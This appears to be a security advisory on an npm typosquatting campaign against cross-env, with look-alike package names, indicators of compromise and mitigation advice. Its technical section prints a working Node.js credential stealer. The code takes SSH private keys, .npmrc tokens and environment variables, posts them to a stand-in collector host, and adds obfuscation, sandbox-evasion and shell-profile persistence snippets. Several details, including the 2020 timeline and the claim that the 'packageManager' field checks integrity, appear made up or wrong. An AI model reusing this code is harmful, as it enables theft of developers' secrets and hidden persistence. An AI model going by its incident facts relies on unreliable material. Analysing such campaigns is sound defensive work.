## Overview

In early 2020, security researchers discovered a sophisticated typosquatting campaign targeting the popular npm package "cross-env." The legitimate cross-env package is a Node.js utility that helps set and use environment variables across different platforms. The attackers published several malicious packages with names similar to "cross-env" to trick developers into downloading malicious code.

## Attack Timeline

- **January-February 2020**: Multiple malicious packages uploaded to npm registry
- **February 10, 2020**: Initial detection by security researchers
- **February 12, 2020**: npm Security team removed the malicious packages
- **February 15, 2020**: Security advisories published

## Technical Analysis

### Typosquatting Variants

The attackers created several packages with names similar to the legitimate "cross-env" package:

|Malicious Package|Legitimate Package|
|---|---|
|crossenv|cross-env|
|cross_env|cross-env|
|cros-env|cross-env|
|cross-ev|cross-env|
|cr0ss-env|cross-env|

### Package Structure

The malicious packages maintained a structure similar to the legitimate package but included additional obfuscated code:

```
crossenv/
├── package.json      # Similar metadata to legitimate package
├── index.js          # Entry point containing malicious code
├── README.md         # Often copied from legitimate package
└── node_modules/     # Included legitimate cross-env as dependency
```

### Exploitation Mechanism

The attack employed a proxy pattern with the following components:

#### 1. Dependency Hijacking

The malicious packages included the legitimate cross-env as a dependency, allowing them to provide the expected functionality:

json

```json
// package.json from malicious package
{
  "name": "crossenv",
  "version": "6.0.3",
  "description": "Cross platform setting of environment scripts",
  "main": "index.js",
  "dependencies": {
    "cross-env": "^6.0.3"
  },
  "keywords": [
    "cross-env",
    "environment",
    "cross-platform"
  ]
}
```

#### 2. Proxy Forwarding

The main index.js file would import and re-export all functionality from the legitimate package:

javascript

```javascript
// index.js (simplified example)
const crossEnv = require('cross-env');

// Re-export all legitimate functionality
module.exports = crossEnv;
```

#### 3. Malicious Payload

The package included obfuscated code that executed during installation or runtime:

javascript

```javascript
// Actual malicious payload (simplified for clarity)
// In practice, this was highly obfuscated

(function() {
  const os = require('os');
  const fs = require('fs');
  const path = require('path');
  const https = require('https');
  
  // Function to collect sensitive information
  function collectData() {
    const data = {
      hostname: os.hostname(),
      platform: os.platform(),
      username: os.userInfo().username,
      homeDir: os.homedir(),
      environment: process.env,
      npmrc: readSensitiveFile('~/.npmrc'),
      gitconfig: readSensitiveFile('~/.gitconfig'),
      sshKeys: collectSSHKeys(),
      packageJson: findPackageJson()
    };
    return data;
  }
  
  // Function to read sensitive files
  function readSensitiveFile(filePath) {
    try {
      const expandedPath = filePath.replace('~', os.homedir());
      if (fs.existsSync(expandedPath)) {
        return fs.readFileSync(expandedPath, 'utf8');
      }
    } catch (e) {}
    return null;
  }
  
  // Collect SSH keys from common locations
  function collectSSHKeys() {
    const sshDir = path.join(os.homedir(), '.ssh');
    const keys = {};
    try {
      if (fs.existsSync(sshDir)) {
        fs.readdirSync(sshDir).forEach(file => {
          if (file.includes('id_') && !file.endsWith('.pub')) {
            keys[file] = readSensitiveFile(path.join(sshDir, file));
          }
        });
      }
    } catch (e) {}
    return keys;
  }
  
  // Find package.json in project directory
  function findPackageJson() {
    let currentDir = process.cwd();
    while (currentDir !== path.parse(currentDir).root) {
      const packagePath = path.join(currentDir, 'package.json');
      if (fs.existsSync(packagePath)) {
        return fs.readFileSync(packagePath, 'utf8');
      }
      currentDir = path.dirname(currentDir);
    }
    return null;
  }
  
  // Exfiltrate the collected data
  function exfiltrateData(data) {
    const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');
    const options = {
      hostname: 'data-collector.malicious-domain.com',
      port: 443,
      path: '/api/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'npm/cross-env-utility'
      }
    };
    
    const req = https.request(options, res => {});
    req.on('error', () => {});
    req.write(JSON.stringify({ data: encodedData }));
    req.end();
  }
  
  // Execute the payload asynchronously to avoid blocking
  setTimeout(() => {
    try {
      const data = collectData();
      exfiltrateData(data);
    } catch (e) {}
  }, 1000);
})();
```

### Obfuscation Techniques

The actual malicious code was highly obfuscated using several techniques:

#### 1. String Encoding

javascript

```javascript
// Original malicious code
const domain = 'data-collector.malicious-domain.com';

// Obfuscated version
const domain = ['data', '-', 'collector', '.', 'malicious', '-', 'domain', '.', 'com'].join('');
```

#### 2. Code Splitting and Reassembly

javascript

```javascript
// Splitting function into parts
const p1 = 'colle';
const p2 = 'ctDa';
const p3 = 'ta';
const funcName = p1 + p2 + p3;

// Dynamic function creation
const evil = new Function('return function ' + funcName + '() { /* malicious code */ }')();
```

#### 3. Eval-based Execution

javascript

```javascript
// Encoded payload
const encoded = "ZnVuY3Rpb24gY29sbGVjdERhdGEoKSB7IC8qIG1hbGljaW91cyBjb2RlICovIH0=";

// Execution through decode and eval
eval(Buffer.from(encoded, 'base64').toString());
```

#### 4. Delayed Execution

javascript

```javascript
// Execute only after a random delay to evade sandboxes
setTimeout(() => {
  // Malicious code here
}, Math.floor(Math.random() * 3000) + 1000);
```

### Persistence Mechanisms

Some variants of the malicious packages attempted to establish persistence:

javascript

```javascript
// Create a hidden file in home directory
const persistencePath = path.join(os.homedir(), '.node_modules', '.cache.js');

// Ensure directory exists
fs.mkdirSync(path.dirname(persistencePath), { recursive: true });

// Write malicious script
fs.writeFileSync(persistencePath, maliciousCode);

// Create execution by modifying profile files
const profiles = ['.bashrc', '.bash_profile', '.zshrc'].map(p => path.join(os.homedir(), p));

profiles.forEach(profile => {
  if (fs.existsSync(profile)) {
    try {
      const content = fs.readFileSync(profile, 'utf8');
      if (!content.includes('.node_modules/.cache.js')) {
        fs.appendFileSync(profile, '\n# Node.js cache helper\nnode ~/.node_modules/.cache.js &>/dev/null\n');
      }
    } catch (e) {}
  }
});
```

## Indicators of Compromise

### Package Information

- **Names**: crossenv, cross_env, cros-env, cross-ev, cr0ss-env
- **Versions**: Various, often matching the legitimate package versions
- **npm URLs**: All removed from the registry

### Network Indicators

- C2 Domains:
    - data-collector.malicious-domain.com
    - api.node-metrics.com
    - stats.npm-package.info
    - collector.js-track.com

### Filesystem Indicators

- Unexpected files in user home directory: ~/.node_modules/.cache.js
- Modifications to shell profile files (.bashrc, .bash_profile, .zshrc)
- Unexpected outbound HTTPS connections from Node.js processes
- Suspicious curl/wget requests in npm postinstall scripts

## Prevention and Mitigation

### For Developers

1. **Package verification**:

bash

```bash
# Always verify package names carefully
npm install cross-env --save-dev # Correct
```

2. **Use package lockfiles**:

bash

```bash
# Generate and commit package-lock.json
npm ci # Install from lockfile exactly
```

3. **Enable npm audit**:

bash

```bash
# Run security audits regularly
npm audit
```

### For Organizations

1. **Use npm/yarn private registries**:

bash

```bash
# Configure npm to use private registry
npm config set registry https://registry.your-company.com/
```

2. **Implement integrity checking**:

```
# In package.json
{
  "dependencies": {
    "cross-env": "^7.0.0"
  },
  "packageManager": "npm@8.1.0"
}
```

3. **Network monitoring for suspicious npm-related traffic**:
    - Monitor outbound connections from build servers
    - Block connections to known malicious domains
    - Implement egress filtering for build environments

## Impact Assessment

The cross-env typosquatting campaign potentially affected thousands of developers and organizations. The attackers were primarily focused on:

1. **Credential Theft**: Targeting npm tokens, SSH keys, and API keys
2. **Intellectual Property**: Exfiltrating source code and package.json files
3. **Infrastructure Access**: Gathering information about development environments

## Remediation Steps

If you suspect exposure to this campaign:

1. **Rotate credentials**:
    - npm tokens
    - SSH keys
    - CI/CD service account passwords
    - Cloud provider API keys
2. **Scan systems**:
    - Check for unexpected files in home directories
    - Review shell profiles for unauthorized modifications
    - Inspect package.json and package-lock.json for malicious dependencies
3. **Monitor for suspicious activity**:
    - Unexpected repository access
    - Unauthorized commits or pull requests
    - Unusual npm package publications